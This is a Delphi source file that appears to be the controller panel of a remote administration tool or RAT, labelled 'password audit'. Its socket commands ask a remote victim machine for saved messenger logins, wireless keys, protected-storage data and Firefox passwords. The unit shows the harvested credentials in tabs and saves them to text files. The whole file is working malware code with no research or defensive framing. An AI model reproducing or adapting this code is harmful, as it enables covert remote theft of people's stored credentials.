unit UnitPasswordAudit;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  UnitFileTransfer,Menus, ImgList, ToolWin, ComCtrls , Jpeg,
  ClipBrd, UnitSharedData, shellapi,CommCtrl, UnitThumbDb;

type
  TPasswordAudit = class(TForm)
    StatusBar1: TStatusBar;
    MessengerPopupMenu: TPopupMenu;
    Refresh1: TMenuItem;
    StoragePopupMenu: TPopupMenu;
    MenuItem2: TMenuItem;
    WirelessPopupMenu: TPopupMenu;
    MenuItem1: TMenuItem;
    ImageList1: TImageList;
    Timer1: TTimer;
    SaveToFile1: TMenuItem;
    SaveToFile2: TMenuItem;
    SaveToFile3: TMenuItem;
    SaveDialog1: TSaveDialog;
    FirefoxPopupMenu: TPopupMenu;
    MenuItem3: TMenuItem;
    MenuItem4: TMenuItem;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    MessengerListView: TListView;
    TabSheet2: TTabSheet;
    StorageListView: TListView;
    TabSheet3: TTabSheet;
    WirelessListView: TListView;
    TabSheet4: TTabSheet;
    FirefoxListView: TListView;
    procedure Refresh1Click(Sender: TObject);
    procedure MessengerListViewCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure MessengerListViewCustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure MenuItem1Click(Sender: TObject);
    procedure MenuItem2Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure SaveToFile1Click(Sender: TObject);
    procedure SaveToFile2Click(Sender: TObject);
    procedure SaveToFile3Click(Sender: TObject);
    procedure FirefoxListViewCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure MenuItem4Click(Sender: TObject);
    procedure MenuItem3Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Version: integer;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  PasswordAudit: TPasswordAudit;

implementation

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  UnitSharedData.SendData(Socket,'PasswordAudit|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TPasswordAudit(SocketData.Form).NewSocket = nil then exit;
  TPasswordAudit(SocketData.Form).Timer1.Enabled := True;
  TPasswordAudit(SocketData.Form).NewSocket := nil;
  TPasswordAudit(SocketData.Form).Caption := TPasswordAudit(SocketData.Form).Caption + ' - [Offline]';
end;

procedure TPasswordAudit.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  if Version = 1 then MenuItem1.Click;
  if Version = 2 then MenuItem2.Click;
  if Version = 3 then Refresh1.Click;
  if Version = 4 then MenuItem3.Click;
end;

procedure TPasswordAudit.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
  Tmp: string;
  p,i: integer;
  Strings: TStringList;
  StringList: TStringList;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  //ShowMessage(Data);

  Strings := TStringList.Create;
  Strings.Text := Data;

  if Command = 'Messenger' then begin
    MessengerListview.Clear;
    for i := 0 to Strings.Count -1 do begin
      Li := MessengerListview.Items.Add;
      Li.Caption := Split(Strings[i],'|',1);
      Li.SubItems.Add(Split(Strings[i],'|',2));
    end;
  end;

  if Command = 'Wireless' then begin
    WirelessListview.Clear;
    for i := 0 to Strings.Count -1 do begin
      Li := WirelessListview.Items.Add;
      Li.Caption := Split(Strings[i],'|',1);
      Li.SubItems.Add(Split(Strings[i],'|',2));
      Li.SubItems.Add(Split(Strings[i],'|',3));
    end;
  end;

  if Command = 'Storage' then begin
    StorageListview.Clear;
    for i := 0 to Strings.Count -1 do begin
      Li := StorageListview.Items.Add;
      Li.Caption := Split(Strings[i],'|',1);
      Li.SubItems.Add(Split(Strings[i],'|',2));
      Li.SubItems.Add(Split(Strings[i],'|',3));
      Li.SubItems.Add(Split(Strings[i],'|',4));
      Li.SubItems.Add(Split(Strings[i],'|',5));
    end;
  end;

  if Command = 'Firefox' then begin
    FirefoxListview.Clear;
    for i := 0 to Strings.Count -1 do begin
      Li := FirefoxListview.Items.Add;
      Li.Caption := Split(Strings[i],'|',1);
      Li.SubItems.Add(Split(Strings[i],'|',2));
      Li.SubItems.Add(Split(Strings[i],'|',3));
    end;
  end;


  Strings.Free;
end;

procedure SaveToFile(Li: TListview; FileName: string);
var
  i,x: integer;
  s: string;
  Stream: TMemoryStream;
begin
  for x := 0 to Li.Items.Count -1 do begin
    for i := 0 to Li.Columns.Count -1 do begin
      if i = 0 then begin
        s := s + Li.Column[i].Caption + ': ' + Li.Items[x].Caption + #13#10;
      end else begin
        s := s + Li.Column[i].Caption + ': ' + Li.Items[x].SubItems[i-1] + #13#10;
      end;
    end;
    s := s + #13#10;
  end;
  Stream := TMemoryStream.Create;
  Stream.Write(pointer(s)^,length(s));
  Stream.SaveToFile(FileName);
  Stream.Free;
end;

procedure TPasswordAudit.Refresh1Click(Sender: TObject);
begin
  SendData(NewSocket,'Messenger');
end;

procedure TPasswordAudit.MessengerListViewCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  TListview(Sender).Canvas.Brush.Color :=  $F7F7F7;
end;

procedure TPasswordAudit.MessengerListViewCustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  TListview(Sender).Canvas.Brush.Color :=  clWhite;
end;

procedure TPasswordAudit.MenuItem1Click(Sender: TObject);
begin
  SendData(NewSocket,'Wireless');
end;

procedure TPasswordAudit.MenuItem2Click(Sender: TObject);
begin
  SendData(NewSocket,'Storage');
end;

procedure TPasswordAudit.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
      UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|PasswordAuditSocket|' + inttostr(Self.Handle));
end;

procedure TPasswordAudit.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TPasswordAudit.SaveToFile1Click(Sender: TObject);
begin
  if not SaveDialog1.Execute then exit;
  SaveToFile(WireLesslistview,SaveDialog1.FileName);
end;

procedure TPasswordAudit.SaveToFile2Click(Sender: TObject);
begin
  if not SaveDialog1.Execute then exit;
  SaveToFile(StorageListview,SaveDialog1.FileName);
end;

procedure TPasswordAudit.SaveToFile3Click(Sender: TObject);
begin
  if not SaveDialog1.Execute then exit;
  SaveToFile(MessengerListview,SaveDialog1.FileName);
end;

procedure TPasswordAudit.FirefoxListViewCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  TListview(Sender).Canvas.Brush.Color :=  $F7F7F7;
end;

procedure TPasswordAudit.MenuItem4Click(Sender: TObject);
begin
  if not SaveDialog1.Execute then exit;
  SaveToFile(FireFoxListview,SaveDialog1.FileName);
end;

procedure TPasswordAudit.MenuItem3Click(Sender: TObject);
begin
  SendData(NewSocket,'Firefox');
end;


end.
